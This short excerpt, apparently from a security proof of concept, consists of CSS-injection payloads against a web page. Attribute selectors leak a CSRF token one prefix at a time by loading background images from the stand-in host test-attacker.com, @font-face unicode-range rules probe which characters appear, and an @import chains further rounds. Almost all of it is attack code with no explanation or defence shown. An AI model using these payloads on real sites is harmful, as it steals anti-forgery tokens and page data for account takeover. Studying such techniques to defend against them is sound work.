...
<script src="/js/app.js"></script>  <!-- Fetches from test-attacker.com -->
...
input[name="csrf"][value^="a"] { background: url(https://test-attacker.com/?token=a); }
input[name="csrf"][value^="b"] { background: url(https://test-attacker.com/?token=b); }
/* ... for each character ... */
input[name="csrf"][value^="ab"] { background: url(https://test-attacker.com/?token=ab); }
...
@font-face { font-family: probe; src: url(https://test-attacker.com/?char=A); unicode-range: U+0041; }
@font-face { font-family: probe; src: url(https://test-attacker.com/?char=B); unicode-range: U+0042; }
...
@import url(https://test-attacker.com/round1.css);
